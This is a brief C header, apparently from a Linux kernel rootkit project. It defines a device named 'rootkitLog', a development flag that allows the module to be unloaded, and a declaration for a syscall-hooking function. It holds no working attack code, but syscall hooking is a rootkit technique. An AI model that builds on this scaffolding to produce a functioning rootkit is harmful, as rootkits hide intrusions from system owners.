#include "environmentSpecificOptions.h"

// Needed if you intend to be able to unload/reload the module without rebooting
#define DEV_MODE

// Dev name as it appears in /proc/devices  
#define DEVICE_NAME "rootkitLog" 

void *hookSyscall(unsigned int syscallNumber, void *hook);

